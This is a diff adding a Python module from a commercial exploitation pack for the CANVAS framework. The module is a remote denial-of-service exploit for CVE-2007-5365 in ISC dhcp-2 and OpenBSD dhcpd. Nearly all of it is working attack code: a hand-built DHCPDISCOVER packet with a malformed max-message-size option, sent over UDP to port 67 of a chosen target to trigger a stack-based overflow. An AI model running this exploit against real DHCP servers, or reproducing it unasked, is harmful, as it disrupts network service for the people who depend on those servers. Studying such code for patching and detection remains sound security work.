@@ -1,0 +1,116 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from MOSDEF import mosdef as mosdef
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "ISC dhcp-2 and OpenBSD dhcpd Remote Denial of Service"
+VERSION = "0.1"
+DESCRIPTION = "ISC dhcp-2 and OpenBSD dhcpd Stack-based buffer overflow Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "DoS"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["OpenBSD"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "ISC dhcp-2 and OpenBSD dhpcd"
+DOCUMENTATION["Date public"] = "2007.10.10"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5365"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5365"
+DOCUMENTATION["Notes"] = "Tested on Ubuntu and OpenBSD 4.0"
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setPort(67)
+		self.setHost("")
+		self.setVersion(1)
+		self.setInfo(DESCRIPTION)
+		self.name=NAME
+		return
+    
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		s = self.getudpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			return 0
+
+		# htype = HTYPE_ETHER
+		# hlen = 6
+		# hops = 0
+		# xid = 12345678
+		# secs = 0
+		# flags = 8000
+		# ciaddr = 0.0.0.0
+		# yiaddr = 0.0.0.0
+		# siaddr = 0.0.0.0
+		# giaddr = 0.0.0.0
+		# chaddr =
+		# sname =
+		# file =
+		# Options :
+		# DHO_DHCP_MESSAGE_TYPE(53) = DHCPDISCOVER
+		# DHO_VENDOR_CLASS_IDENTIFIER(60) = d2sec.com
+		# DHO_DHCP_MAX_MESSAGE_SIZE(57) = 280
+		# padding [0] =
+
+		buf  = s_binary("01 01 06 00")
+		buf += s_binary("12 34 56 78 00 00 80 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 63 82 53 63 35 01 01 3c")
+		buf += s_binary("09 64 32 73 65 63 2e 63 6f 6d 39 02 01 18 ff 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
+		buf += s_binary("00 00 00 00 00 00 00 00")
+
+		try:
+			s.sendall(buf)
+		except:
+			pass
+
+		self.log("Done with exploit")
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+		return 0 
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p udpport:67]"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
